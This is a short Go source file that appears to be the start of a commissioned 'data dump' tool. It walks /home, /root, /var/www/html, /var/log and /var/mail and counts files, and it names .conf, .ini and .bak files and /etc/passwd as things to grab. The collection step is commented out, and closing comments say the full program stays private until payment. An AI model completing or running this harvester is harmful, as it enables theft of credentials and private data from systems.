package main

import (
	"fmt"
	"path/filepath"
	"os"
)


type dataDump struct {
	dataLD []string
	entireStruct string
	output string
	root bool
}

// -- Setters --
func (d *dataDump) SetDataLD(data []string) {
	d.dataLD = data
}

func (d *dataDump) SetEntireStruct(entirity string) {
	d.entireStruct = entirity
}

func (d *dataDump) SetOutput(output string) {
	d.output = output
}

func (d *dataDump) SetRoot(root bool) {
	d.root = root
}
// -- Setters --


func main() {
	// Create the model, and assign the locations to grab i.e /home, /etc/passwd, *.conf
	model := dataDump{}
	directories := []string{
		"/home/",
		"/root/",
		"/var/www/html",
		"/var/log/",
		"/var/mail/",
	}
	filetypes := []string{
		".conf",
		".ini",
		".bak",
	}


	fmt.Println("Starting")
	fetchFiles(directories, filetypes, &model)
}

func fetchFiles(directories []string, filetypes []string, m *dataDump) {
	fmt.Println("Fetching directories...")
	for index, dir := range directories {
		var amountOfFiles []string
		err := filepath.Walk(dir,
			func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}

			amountOfFiles = append(amountOfFiles, path)
			// fmt.Println(path, info.Size())
			return nil
		})
		if err != nil {
			fmt.Printf("Index: %d, Error: %v\n", index, err)
		}

		fmt.Printf("Index: %d, Files: %d, Directory: %v\n", index, len(amountOfFiles), dir)
	}

	// fmt.Println("Fetching important files")
	// for index, file := range filetypes {
	// 	continue
	// }
}

// The full program will stay private and not pushed here, due to the potential of scammed that way
// I will keep you updated on the program by sending you videos
// After everything has been completed, and our transaction has been fullfilled. I will push everything here.
